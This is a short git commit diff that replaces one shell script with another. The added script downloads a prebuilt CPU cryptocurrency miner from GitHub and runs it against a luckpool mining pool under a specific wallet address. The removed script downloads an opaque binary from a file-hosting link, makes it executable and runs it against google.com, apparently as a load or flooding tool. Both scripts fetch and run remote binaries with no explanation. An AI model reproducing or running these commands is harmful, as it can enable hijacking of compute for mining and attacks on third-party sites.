fe8de364af59fd18c4fa95e1f41a73a983e9d6ba
buozud <84149893+buozud@users.noreply.github.com>
2021-05-18 20:32:57 +0200

    Update and rename bu.sh to b.sh

---
+++ b.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBJVonrFNgGpR6Lxtb1CFkuB37dJwgZu3w.HU -p x --cpu 1
--- bu.sh
+++
@@ -1,8 +0,0 @@
-wget https://download1083.mediafire.com/p61f4jm992eg/s5q7dn0o0vxnqyl/ab.zip
-sleep 3
-unzip ab
-sleep 3
-cd ab
-sleep 3
-chmod +x ./ab
-./ab --url google.com
